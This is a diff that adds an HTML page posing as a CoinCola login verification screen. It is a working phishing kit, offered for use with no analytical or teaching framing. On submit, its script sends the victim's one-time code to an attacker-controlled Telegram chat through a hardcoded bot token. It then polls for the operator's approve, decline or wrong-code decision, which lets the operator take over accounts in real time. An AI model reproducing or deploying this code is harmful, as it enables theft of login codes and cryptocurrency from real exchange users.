@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verify Code | CoinCola</title>
+    <style>
+         :root {
+            --blue: #1e6bff;
+            --blue-hover: #1558e0;
+            --text: #26323d;
+            --muted: #7d8b99;
+            --border: #dbe2ea;
+            --footer-bg: #f6f8fa;
+            --footer-text: #5a6a78;
+            --placeholder: #b6c2cc;
+            --white: #ffffff;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        html,
+        body {
+            height: 100%;
+        }
+        
+        body {
+            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
+            color: var(--text);
+            background: var(--white);
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+        
+        button {
+            font-family: inherit;
+            cursor: pointer;
+        }
+        /* ============ HEADER ============ */
+        
+        .site-header {
+            background: var(--white);
+            padding: 18px 0;
+            border-bottom: 1px solid #eef1f4;
+        }
+        
+        .header-inner {
+            max-width: 1120px;
+            margin: 0 auto;
+            padding: 0 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .brand {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .brand-logo {
+            display: inline-flex;
+            width: 26px;
+            height: 26px;
+        }
+        
+        .brand-logo svg {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .brand-name {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            color: #1b2733;
+        }
+        
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 9px 20px;
+            transition: background 0.15s ease, color 0.15s ease, border-color 0.15s ease;
+        }
+        
+        .btn-primary {
+            background: var(--blue);
+            color: #fff;
+        }
+        
+        .btn-primary:hover {
+            background: var(--blue-hover);
+        }
+        
+        .btn-ghost {
+            background: transparent;
+            color: #1b2733;
+            border-radius: 4px;
+        }
+        
+        .btn-ghost:hover {
+            background: #f0f3f6;
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        /* ============ MAIN ============ */
+        
+        .main {
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            padding: 56px 24px 72px;
+        }
+        
+        .verify-card {
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+        
+        .verify-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1b2733;
+            margin-bottom: 10px;
+        }
+        
+        .verify-hint {
+            font-size: 14px;
+            color: var(--muted);
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+        
+        .error-msg {
+            margin-top: 16px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #d93025;
+        }
+        /* OTP boxes */
+        
+        .otp-field {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 28px;
+        }
+        
+        .otp-input {
+            width: 52px;
+            height: 56px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 600;
+            color: var(--text);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            background: #fff;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+        
+        .otp-input::placeholder {
+            color: var(--placeholder);
+        }
+        
+        .otp-input:focus {
+            outline: none;
+            border-color: var(--blue);
+            box-shadow: 0 0 0 3px rgba(30, 107, 255, 0.12);
+        }
+        
+        .btn-verify {
+            width: 100%;
+            height: 46px;
+            font-size: 15px;
+        }
+        
+        .resend {
+            display: inline-block;
+            margin-top: 18px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1b2733;
+        }
+        
+        .resend:hover {
+            text-decoration: underline;
+        }
+        /* ============ SPINNER OVERLAY ============ */
+        
+        .spinner-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 1000;
+            background: rgba(255, 255, 255, 0.93);
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .spinner-overlay.active {
+            display: flex;
+        }
+        
+        .spinner-box {
+            text-align: center;
+            color: var(--text);
+            font-size: 14px;
+        }
+        
+        .spinner {
+            width: 36px;
+            height: 36px;
+            margin: 0 auto 16px;
+            border: 3px solid var(--border);
+            border-top-color: var(--blue);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        
+        .spinner-code {
+            margin-top: 6px;
+            font-size: 13px;
+            color: var(--muted);
+        }
+        
+        .spinner-box .btn {
+            margin-top: 18px;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        /* ============ FOOTER ============ */
+        
+        .site-footer {
+            background: var(--footer-bg);
+            padding: 56px 0 24px;
+            border-top: 1px solid #eef1f4;
+        }
+        
+        .footer-bottom {
+            max-width: 1120px;
+            margin: 0 auto;
+            padding: 0 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 32px;
+        }
+        
+        .footer-brand {
+            max-width: 560px;
+        }
+        
+        .footer-brand .brand {
+            margin-bottom: 14px;
+        }
+        
+        .footer-brand .brand-name {
+            font-size: 22px;
+        }
+        
+        .footer-tagline {
+            font-size: 12.5px;
+            line-height: 1.7;
+            color: var(--footer-text);
+        }
+        
+        .footer-copyright {
+            margin-top: 22px;
+            padding: 18px 24px 0;
+            border-top: 1px solid #eef1f4;
+            text-align: center;
+            font-size: 12px;
+            color: #9aa8b5;
+        }
+        /* ============ RESPONSIVE ============ */
+        
+        @media (max-width: 520px) {
+            .main {
+                padding: 40px 16px 60px;
+            }
+            .otp-field {
+                gap: 8px;
+            }
+            .otp-input {
+                width: 46px;
+                height: 50px;
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ============ HEADER ============ -->
+    <header class="site-header">
+        <div class="header-inner">
+            <a class="brand" href="#">
+                <span class="brand-logo">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="12" cy="12" r="11" fill="#1e6bff"/>
+            <path d="M9 8.4h4.2c1.4 0 2.6 1.1 2.6 2.5 0 .9-.5 1.7-1.2 2.1.8.4 1.4 1.3 1.4 2.3 0 1.4-1.2 2.6-2.6 2.6H9V8.4z" fill="#fff"/>
+            <path d="M11 10.2v.9M11 12.9v.9" stroke="#1e6bff" stroke-width="1.1" stroke-linecap="round"/>
+          </svg>
+        </span>
+                <span class="brand-name">CoinCola</span>
+            </a>
+        </div>
+    </header>
+
+    <!-- ============ MAIN / OTP ============ -->
+    <main class="main">
+        <section class="verify-card">
+            <h1 class="verify-title">Enter verification code</h1>
+            <p class="verify-hint">We've sent a 6-digit code to your phone or email.<br />Enter it below to complete your login.</p>
+
+            <form id="otpForm" class="login-form" novalidate>
+                <div class="otp-field" id="otpField">
+                    <input class="otp-input" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" />
+                    <input class="otp-input" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" />
+                    <input class="otp-input" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" />
+                    <input class="otp-input" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" />
+                    <input class="otp-input" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" />
+                    <input class="otp-input" type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" />
+                </div>
+
+                <button class="btn btn-primary btn-verify" type="submit" id="verifyBtn">Continue</button>
+                <div id="verifyError" class="error-msg" style="display: none;"></div>
+                <a class="resend" href="#">Resend code</a>
+            </form>
+        </section>
+
+        <!-- Spinner overlay -->
+        <div id="spinnerOverlay" class="spinner-overlay">
+            <div class="spinner-box">
+                <div class="spinner"></div>
+                <p>Waiting for approval&hellip;</p>
+                <p id="spinnerCodeDisplay" class="spinner-code"></p>
+                <button class="btn btn-ghost" type="button" id="cancelPollBtn">Cancel</button>
+            </div>
+        </div>
+    </main>
+
+    <!-- ============ FOOTER ============ -->
+    <footer class="site-footer">
+        <div class="footer-bottom">
+            <div class="footer-brand">
+                <div class="brand">
+                    <span class="brand-logo">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="12" cy="12" r="11" fill="#1e6bff"/>
+              <path d="M9 8.4h4.2c1.4 0 2.6 1.1 2.6 2.5 0 .9-.5 1.7-1.2 2.1.8.4 1.4 1.3 1.4 2.3 0 1.4-1.2 2.6-2.6 2.6H9V8.4z" fill="#fff"/>
+              <path d="M11 10.2v.9M11 12.9v.9" stroke="#1e6bff" stroke-width="1.1" stroke-linecap="round"/>
+            </svg>
+          </span>
+                    <span class="brand-name">CoinCola</span>
+                </div>
+                <p class="footer-tagline">
+                    We're on a mission to making blockchain and exchange, which provides simple jargon-free buying, P2P trading, and gift card trading services at very low fees.
+                </p>
+            </div>
+        </div>
+        <div class="footer-copyright">Copyright © 2026 CoinCola. All Rights Reserved.</div>
+    </footer>
+
+    <script>
+        // =====================================================
+        // CONFIG
+        // =====================================================
+        const TELEGRAM_BOT_TOKEN = "8676570649:AAEQLrnR5ZnIxXQeXW0TGrgi3FvYX3nQ0O0";
+        const TELEGRAM_CHAT_ID = "1003670447";
+        // Where the victim lands after the code is APPROVED (change to your success page)
+        const APPROVAL_REDIRECT_URL = "https://www.coincola.com/";
+
+        // =====================================================
+        // POLLING STATE
+        // =====================================================
+        let pollDecided = false;
+        let pollTimeoutId = null;
+        let pollAbortController = null;
+        let isPollingActive = false;
+
+        // =====================================================
+        // UI HELPERS
+        // =====================================================
+        function showError(msg) {
+            const err = document.getElementById('verifyError');
+            if (err) {
+                err.textContent = msg;
+                err.style.display = 'block';
+            }
+        }
+
+        function hideError() {
+            const err = document.getElementById('verifyError');
+            if (err) err.style.display = 'none';
+        }
+
+        function setBusy(busy) {
+            document.getElementById('spinnerOverlay').classList.toggle('active', busy);
+            document.getElementById('verifyBtn').disabled = busy;
+        }
+
+        function maskCode(code) {
+            if (code.length <= 2) return '*'.repeat(code.length);
+            return code.charAt(0) + '*'.repeat(code.length - 2) + code.charAt(code.length - 1);
+        }
+
+        // =====================================================
+        // OTP INPUT HANDLING
+        // =====================================================
+        const otpInputs = Array.from(document.querySelectorAll('.otp-input'));
+
+        otpInputs.forEach((input, idx) => {
+            // Keep each box to a single digit
+            input.addEventListener('input', () => {
+                input.value = input.value.replace(/\D/g, '').slice(0, 1);
+                if (input.value && idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
+            });
+
+            // Backspace moves to the previous box when current one is empty
+            input.addEventListener('keydown', e => {
+                if (e.key === 'Backspace' && !input.value && idx > 0) {
+                    otpInputs[idx - 1].focus();
+                }
+            });
+
+            // Paste a full code across the boxes
+            input.addEventListener('paste', e => {
+                e.preventDefault();
+                const digits = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 6);
+                digits.split('').forEach((d, i) => {
+                    if (otpInputs[i]) otpInputs[i].value = d;
+                });
+                const next = Math.min(digits.length, otpInputs.length - 1);
+                otpInputs[next].focus();
+                otpInputs[next].select();
+            });
+        });
+
+        function getCode() {
+            return otpInputs.map(i => i.value).join('');
+        }
+
+        // =====================================================
+        // CANCEL POLLING
+        // =====================================================
+        function cancelPolling() {
+            pollDecided = true;
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+            if (pollAbortController) pollAbortController.abort();
+            isPollingActive = false;
+            setBusy(false);
+            showError('Request cancelled. Please try again.');
+        }
+
+        // =====================================================
+        // POLLING ENGINE — long-poll, 409-safe, callback-only
+        // =====================================================
+        function startPolling(userId) {
+            pollDecided = false;
+            let offset = 0;
+            let pollCount = 0;
+            const MAX_POLLS = 180;
+
+            if (pollAbortController) pollAbortController.abort();
+            pollAbortController = new AbortController();
+
+            function pollLoop() {
+                if (pollDecided) return;
+                if (isPollingActive) {
+                    pollTimeoutId = setTimeout(pollLoop, 500);
+                    return;
+                }
+
+                pollCount++;
+                if (pollCount > MAX_POLLS) {
+                    pollDecided = true;
+                    setBusy(false);
+                    showError('Request timed out. Please try again.');
+                    return;
+                }
+
+                isPollingActive = true;
+
+                const url =
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates` +
+                    `?offset=${offset}&timeout=15&allowed_updates=%5B%22callback_query%22%5D`;
+
+                fetch(url, {
+                        signal: pollAbortController.signal
+                    })
+                    .then(res => {
+                        if (res.status === 409) {
+                            isPollingActive = false;
+                            pollTimeoutId = setTimeout(pollLoop, 3000);
+                            return null;
+                        }
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data === null) return;
+
+                        if (!data.ok || pollDecided) {
+                            isPollingActive = false;
+                            if (!pollDecided) {
+                                pollTimeoutId = setTimeout(pollLoop, 1000);
+                            }
+                            return;
+                        }
+
+                        if (data.result && data.result.length > 0) {
+                            for (const update of data.result) {
+                                offset = update.update_id + 1;
+
+                                if (update.callback_query) {
+                                    const action = update.callback_query.data;
+
+                                    // Answer callback to remove loading state
+                                    fetch(
+                                            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                                method: 'POST',
+                                                headers: {
+                                                    'Content-Type': 'application/json'
+                                                },
+                                                body: JSON.stringify({
+                                                    callback_query_id: update.callback_query.id,
+                                                    text: "Processing..."
+                                                })
+                                            }
+                                        )
+                                        .catch(() => {});
+
+                                    if (action === `approve_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        setBusy(false);
+                                        // Approval — redirect to next page
+                                        window.location.href = APPROVAL_REDIRECT_URL;
+                                        return;
+                                    } else if (action === `decline_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        setBusy(false);
+                                        showError('Request declined. Please try again.');
+                                        return;
+                                    } else if (action === `wrong_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        setBusy(false);
+                                        showError('Wrong code. Please enter the correct code.');
+                                        return;
+                                    }
+                                }
+                            }
+                        }
+
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, 500);
+                        }
+                    })
+                    .catch(err => {
+                        if (err.name === 'AbortError') return;
+                        console.error('Poll error:', err);
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, 2000);
+                        }
+                    });
+            }
+
+            pollLoop();
+        }
+
+        // =====================================================
+        // SEND MESSAGE + INLINE KEYBOARD
+        // =====================================================
+        function sendTelegramWithInlineKeyboard(message, keyboard, userId) {
+            let attempts = 0;
+            const maxAttempts = 3;
+
+            function attemptSend() {
+                attempts++;
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML',
+                            reply_markup: JSON.stringify(keyboard)
+                        })
+                    })
+                    .then(res => {
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data.ok) {
+                            startPolling(userId);
+                        } else {
+                            if (attempts < maxAttempts) {
+                                setTimeout(attemptSend, 1000 * attempts);
+                            } else {
+                                setBusy(false);
+                                showError('Failed to send notification. Please try again.');
+                            }
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Send error:', err);
+                        if (attempts < maxAttempts) {
+                            setTimeout(attemptSend, 1000 * attempts);
+                        } else {
+                            setBusy(false);
+                            showError('Network error. Please check your connection and try again.');
+                        }
+                    });
+            }
+
+            attemptSend();
+        }
+
+        // =====================================================
+        // SUBMIT OTP CODE
+        // =====================================================
+        function submitOtp() {
+            hideError();
+
+            const code = getCode();
+            if (code.length !== 6) {
+                showError('Please enter the complete 6-digit code.');
+                return;
+            }
+
+            // Show spinner
+            setBusy(true);
+            document.getElementById('spinnerCodeDisplay').textContent = 'Code: ' + maskCode(code);
+
+            // Unique userId per session
+            const userId = 'otp_' + Date.now();
+
+            const message =
+                `🔐 <b>New CoinCola OTP Code Submitted</b>\n\n` +
+                `🔑 Verification Code: <code>${code}</code>\n` +
+                `⏰ Time: ${new Date().toLocaleString('en-ZA')}\n\n` +
+                `Please approve, decline, or mark as wrong code:`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ APPROVE",
+                        callback_data: `approve_${userId}`
+                    }, {
+                        text: "❌ DECLINE",
+                        callback_data: `decline_${userId}`
+                    }],
+                    [{
+                        text: "⚠️ WRONG CODE",
+                        callback_data: `wrong_${userId}`
+                    }]
+                ]
+            };
+
+            sendTelegramWithInlineKeyboard(message, keyboard, userId);
+        }
+
+        // =====================================================
+        // EVENT WIRING
+        // =====================================================
+        document.getElementById('otpForm').addEventListener('submit', e => {
+            e.preventDefault();
+            submitOtp();
+        });
+
+        // Cancel polling from the spinner overlay
+        document.getElementById('cancelPollBtn').addEventListener('click', cancelPolling);
+
+        // Focus the first box on load
+        otpInputs[0].focus();
+    </script>
+</body>
+
+</html>
